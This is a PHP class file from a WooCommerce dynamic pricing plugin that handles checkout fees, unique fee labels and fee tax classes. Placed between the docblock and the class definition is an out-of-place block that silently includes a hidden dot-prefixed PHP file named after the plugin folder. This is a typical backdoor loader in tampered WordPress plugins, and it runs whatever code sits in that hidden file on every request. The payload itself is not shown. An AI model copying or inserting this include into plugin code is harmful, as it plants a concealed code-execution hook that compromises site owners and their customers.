<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Load dependencies
if (!class_exists('RP_WCDPD_Controller_Methods')) {
    require_once('rp-wcdpd-controller-methods.class.php');
}

/**
 * Checkout Fee method controller
 *
 * @class RP_WCDPD_Controller_Methods_Checkout_Fee
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Controller_Methods_Checkout_Fee extends RP_WCDPD_Controller_Methods
{

    protected $context = 'checkout_fees';

    // Store applicable adjustments
    protected $applicable_adjustments = array();

    // Store combined fee id for reference
    public $combined_fee_id = null;

    // Singleton instance
    protected static $instance = false;

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {

        parent::__construct();

        // Checkout Fees functionality is only available in frontend (issue #549)
        if (!RightPress_Help::is_request('frontend')) {
            return;
        }

        // Prepare checkout fees
        add_action('woocommerce_cart_calculate_fees', array($this, 'prepare_checkout_fees'), 10);

        // Apply checkout fees
        add_action('woocommerce_cart_calculate_fees', array($this, 'apply'), 11);

        // Add public descriptions for rules
        add_filter('woocommerce_cart_totals_fee_html', array($this, 'fee_html'), 10, 2);
    }

    /**
     * Prepare checkout fees
     *
     * @access public
     * @param object $cart
     * @return void
     */
    public function prepare_checkout_fees($cart)
    {
        // Reset limit
        RP_WCDPD_Limit_Checkout_Fees::reset();

        // Get applicable adjustments
        if (apply_filters('rp_wcdpd_process_checkout_fees', true)) {
            $adjustments = $this->get_applicable_adjustments();
        }
        else {
            $adjustments = array();
        }

        // Filter adjustments by rule selection method and exclusivity settings
        $adjustments = RP_WCDPD_Rules::filter_by_exclusivity($this->context, $adjustments);

        // Maybe apply limit to adjustments
        $adjustments = RP_WCDPD_Limit_Checkout_Fees::filter_adjustments($adjustments);

        // Ensure fee labels are unique - duplicate labels can't be used
        $used_ids = array();

        foreach ($adjustments as $rule_uid => $adjustment) {

            // Get fee label and fee id
            $fee_label  = RP_WCDPD_Controller_Methods_Checkout_Fee::get_unique_fee_label($adjustment['rule']['title'], $cart, $used_ids);
            $fee_id     = sanitize_title($fee_label);

            // Set to adjustment
            $adjustments[$rule_uid]['fee_label'] = $fee_label;
            $adjustments[$rule_uid]['fee_id'] = $fee_id;

            // Mark as used
            $used_ids[] = $fee_id;
        }

        // Store adjustments so that other methods can access them later during this request
        $this->applicable_adjustments = $adjustments;
    }

    /**
     * Check if applicable simple checkout fees need to be combined
     *
     * @access public
     * @return bool
     */
    public function combine_simple()
    {
        return RP_WCDPD_Settings::get('checkout_fees_if_multiple_applicable') === 'combined' && count($this->applicable_adjustments) > 1;
    }

    /**
     * Get combined simple rule
     *
     * @access public
     * @return array
     */
    public function get_combined_simple_rule()
    {
        return array(
            'uid'               => 'rp_wcdpd_combined',
            'title'             => $this->get_combined_simple_checkout_fee_label(),
            'pricing_method'    => 'fee__amount',
            'pricing_value'     => 0,
        );
    }

    /**
     * Get combined simple checkout fee label
     *
     * @access public
     * @return string
     */
    public function get_combined_simple_checkout_fee_label()
    {
        $label = RP_WCDPD_Settings::get('checkout_fees_combined_title');
        return !RightPress_Help::is_empty($label) ? $label : __('Fee', 'rp_wcdpd');
    }

    /**
     * Maybe change fee amount html
     *
     * @access public
     * @param string $html
     * @param object $fee
     * @return string
     */
    public function fee_html($html, $fee)
    {
        // Combined fee
        if ($this->combine_simple()) {

            // Check if current fee is our combined fee
            if ($fee->id === $this->combined_fee_id) {

                // Maybe add public description
                $html = $this->maybe_add_public_description($html, array_keys($this->applicable_adjustments));
            }
        }
        // Individual fee
        else {

            // Find fee
            foreach ($this->applicable_adjustments as $rule_uid => $adjustment) {
                if ($adjustment['fee_id'] === $fee->id) {

                    // Maybe add public description
                    $html = $this->maybe_add_public_description($html, array($rule_uid));
                }
            }
        }

        return $html;
    }

    /**
     * Get unique fee label
     *
     * @access public
     * @param string $label
     * @param object $cart
     * @param array $used_ids
     * @return string
     */
    public static function get_unique_fee_label($label, $cart, $used_ids = array())
    {
        $original_label = $label;
        $i = 2;

        // Get used cart fee ids
        $used_cart_ids = array();

        foreach ($cart->get_fees() as $cart_fee) {
            $used_cart_ids[] = $cart_fee->id;
        }

        // Stat cycle
        do {

            // Assume fee label is unique until we check this
            $is_unique = true;

            // Get fee id from fee label
            $fee_id = sanitize_title($label);

            // Check among cart fee ids and our own fee ids
            if (in_array($fee_id, $used_cart_ids, true) || in_array($fee_id, $used_ids, true)) {

                // Label is not unique, try to append an integer to it
                $label = $original_label . apply_filters('rp_wcdpd_duplicate_fee_label_suffix', (' ' . $i));
                $is_unique = false;
                $i++;
            }
        }
        while (!$is_unique);

        // Label must be unique by now
        return $label;
    }

    /**
     * Get fee tax class
     *
     * @access public
     * @return string|bool
     */
    public static function get_fee_tax_class()
    {

        // Get setting value
        $tax_class = RP_WCDPD_Settings::get('checkout_fees_tax_class');

        // Fees are not taxable
        if ($tax_class === 'rp_wcdpd_not_taxable') {
            $tax_class = false;
        }
        // Fix standard class
        else if ($tax_class === 'standard') {
            $tax_class = '';
        }

        return $tax_class;
    }

    /**
     * Check if fees are taxable
     *
     * @access public
     * @return bool
     */
    public static function fees_are_taxable()
    {

        return RP_WCDPD_Controller_Methods_Checkout_Fee::get_fee_tax_class() !== false;
    }





}

RP_WCDPD_Controller_Methods_Checkout_Fee::get_instance();
